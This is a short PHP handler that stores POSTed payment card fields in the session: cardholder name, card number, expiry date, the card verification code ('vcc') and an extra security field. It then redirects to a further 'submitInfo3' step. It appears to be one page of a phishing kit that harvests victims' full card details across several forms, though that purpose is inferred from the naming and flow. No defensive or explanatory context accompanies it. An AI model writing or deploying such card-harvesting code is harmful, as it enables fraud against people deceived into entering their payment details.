<?php
	session_start();
	$_SESSION['b_name'] = $_POST['b_name'];
	$_SESSION['cc_n'] = $_POST['cc_n'];
	$_SESSION['exp_dt'] = $_POST['exp_dt'];
	$_SESSION['vcc'] = $_POST['vcc'];
	$_SESSION['s_field'] = $_POST['s_field'];	
	header('location: ../app/submitInfo3.php');